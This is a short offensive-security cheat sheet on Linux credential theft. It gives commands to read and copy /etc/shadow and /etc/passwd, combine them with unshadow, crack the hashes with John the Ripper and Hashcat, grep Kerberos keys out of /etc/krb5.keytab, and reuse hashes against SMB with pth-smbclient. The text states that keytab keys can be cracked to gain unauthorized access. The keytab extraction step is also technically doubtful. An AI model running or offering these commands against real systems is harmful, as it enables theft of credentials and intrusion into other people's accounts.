 Root access is necessary for the extraction process
#### **Hash Extraction**

**Prerequisites:**
- **Root Access:** Required to access and extract password hashes.

**Extracting Hashes:**
- **Command:**
  ```bash
  cat /etc/shadow
  ```
  - **Use Case:** Extracts the password hashes from the `/etc/shadow` file, where user password hashes are stored in Linux.

**Copying Necessary Files for Unshadowing:**
- **Commands:**
  ```bash
  cp /etc/passwd /some/location
  cp /etc/shadow /some/location
  ```
  - **Use Case:** Copies the `passwd` and `shadow` files to a specified location for further processing.

**Unshadowing:**
- **Command:**
  ```bash
  unshadow passwd shadow > unshadowed
  ```
  - **Use Case:** Combines the `passwd` and `shadow` files into a single file (`unshadowed`) that can be used for password cracking with tools like John the Ripper.

---

#### **Kerberos Hash Extraction**

**Location:**
- **Keytab Files:** `/etc/krb5.keytab`
  - **Use Case:** Keytab files store Kerberos keys, which can be extracted and cracked to gain unauthorized access.

**Extracting Kerberos Hashes:**
- **Command:**
  ```bash
  strings /etc/krb5.keytab | grep -E 'krbtgt|user'
  ```
  - **Use Case:** Extracts Kerberos ticket-granting service (krbtgt) hashes and user keys from keytab files.

---

#### **Cracking Hashes**

**Using John the Ripper:**
- **Command:**
  ```bash
  john --wordlist=/path/to/wordlist.txt unshadowed
  ```
  - **Use Case:** Cracks the unshadowed password file using a specified wordlist.

**Using Hashcat:**
- **Command:**
  ```bash
  hashcat -m 1800 -a 0 unshadowed /path/to/wordlist.txt
  ```
  - **Use Case:** Cracks the Linux SHA-512 password hashes (mode 1800) using Hashcat with a specified wordlist.

---

#### **Passing the Hash**

**Using Pass-the-Hash on Linux:**
- **Command:**
  ```bash
  pth-smbclient -L //target_ip -U userne%password_hash
  ```
  - **Use Case:** Leverages a cracked hash to authenticate to a remote SMB service without knowing the plaintext password.
